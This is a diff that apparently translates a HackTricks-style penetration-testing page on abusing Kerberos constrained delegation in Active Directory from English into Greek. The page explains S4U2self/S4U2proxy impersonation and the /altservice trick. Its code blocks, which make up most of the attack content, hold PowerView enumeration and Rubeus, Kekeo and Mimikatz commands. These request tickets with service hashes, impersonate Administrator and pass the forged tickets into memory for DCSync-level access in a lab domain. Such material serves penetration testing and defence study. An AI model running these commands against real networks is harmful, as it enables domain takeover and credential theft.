@@ -4,19 +4,18 @@
 
 ## Constrained Delegation
 
-Using this a Domain admin can **allow** a computer to **impersonate a user or computer** against a **service** of a machine.
+Χρησιμοποιώντας αυτό, ένας διαχειριστής τομέα μπορεί να **επιτρέψει** σε έναν υπολογιστή να **παριστάνει έναν χρήστη ή υπολογιστή** απέναντι σε μια **υπηρεσία** μιας μηχανής.
 
-- **Service for User to self (**_**S4U2self**_**):** If a **service account** has a _userAccountControl_ value containing [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), then it can obtain a TGS for itself (the service) on behalf of any other user.
-- **Service for User to Proxy(**_**S4U2proxy**_**):** A **service account** could obtain a TGS on behalf any user to the service set in **msDS-AllowedToDelegateTo.** To do so, it first need a TGS from that user to itself, but it can use S4U2self to obtain that TGS before requesting the other one.
+- **Υπηρεσία για Χρήστη σε αυτο (**_**S4U2self**_**):** Εάν ένας **λογαριασμός υπηρεσίας** έχει μια τιμή _userAccountControl_ που περιέχει [TRUSTED_TO_AUTH_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D), τότε μπορεί να αποκτήσει ένα TGS για τον εαυτό του (την υπηρεσία) εκ μέρους οποιουδήποτε άλλου χρήστη.
+- **Υπηρεσία για Χρήστη σε Proxy(**_**S4U2proxy**_**):** Ένας **λογαριασμός υπηρεσίας** θα μπορούσε να αποκτήσει ένα TGS εκ μέρους οποιουδήποτε χρήστη για την υπηρεσία που έχει οριστεί στο **msDS-AllowedToDelegateTo.** Για να το κάνει αυτό, χρειάζεται πρώτα ένα TGS από αυτόν τον χρήστη προς τον εαυτό του, αλλά μπορεί να χρησιμοποιήσει το S4U2self για να αποκτήσει αυτό το TGS πριν ζητήσει το άλλο.
 
-**Note**: If a user is marked as ‘_Account is sensitive and cannot be delegated_ ’ in AD, you will **not be able to impersonate** them.
+**Σημείωση**: Εάν ένας χρήστης έχει σημειωθεί ως ‘_Ο λογαριασμός είναι ευαίσθητος και δεν μπορεί να ανατεθεί_’ στο AD, δεν θα **μπορείτε να τον παριστάνετε**.
 
-This means that if you **compromise the hash of the service** you can **impersonate users** and obtain **access** on their behalf to the **service configured** (possible **privesc**).
+Αυτό σημαίνει ότι αν **συμβιβάσετε το hash της υπηρεσίας** μπορείτε να **παριστάνετε χρήστες** και να αποκτήσετε **πρόσβαση** εκ μέρους τους στην **ρυθμισμένη υπηρεσία** (πιθανή **privesc**).
 
-Moreover, you **won't only have access to the service that the user is able to impersonate, but also to any service** because the SPN (the service name requested) is not being checked, only privileges. Therefore, if you have access to **CIFS service** you can also have access to **HOST service** using `/altservice` flag in Rubeus.
+Επιπλέον, **δεν θα έχετε μόνο πρόσβαση στην υπηρεσία που μπορεί να παριστάνει ο χρήστης, αλλά και σε οποιαδήποτε υπηρεσία** επειδή το SPN (το όνομα της υπηρεσίας που ζητείται) δεν ελέγχεται, μόνο τα δικαιώματα. Επομένως, αν έχετε πρόσβαση στην **υπηρεσία CIFS** μπορείτε επίσης να έχετε πρόσβαση στην **υπηρεσία HOST** χρησιμοποιώντας την επιλογή `/altservice` στο Rubeus.
 
-Also, **LDAP service access on DC**, is what is needed to exploit a **DCSync**.
-
+Επίσης, η **πρόσβαση στην υπηρεσία LDAP στον DC**, είναι αυτό που χρειάζεται για να εκμεταλλευτείτε ένα **DCSync**.
 ```bash:Enumerate
 # Powerview
 Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
@@ -44,12 +43,10 @@ tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /aes256:babf31
 tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
 .\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
 ```
-
 > [!WARNING]
-> There are **other ways to obtain a TGT ticket** or the **RC4** or **AES256** without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory Certificate Service abuse
+> Υπάρχουν **άλλοι τρόποι για να αποκτήσετε ένα TGT ticket** ή το **RC4** ή **AES256** χωρίς να είστε SYSTEM στον υπολογιστή, όπως το Printer Bug και η unconstrained delegation, NTLM relaying και η κακή χρήση του Active Directory Certificate Service.
 >
-> **Just having that TGT ticket (or hashed) you can perform this attack without compromising the whole computer.**
-
+> **Απλά έχοντας αυτό το TGT ticket (ή hashed) μπορείτε να εκτελέσετε αυτή την επίθεση χωρίς να διακυβεύσετε ολόκληρο τον υπολογιστή.**
 ```bash:Using Rubeus
 #Obtain a TGS of the Administrator user to self
 .\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator
@@ -77,8 +74,6 @@ tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.mo
 #Load the TGS in memory
 Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
 ```
-
-[**More information in ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
+[**Περισσότερες πληροφορίες στο ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)
 
 {{#include ../../banners/hacktricks-training.md}}
-
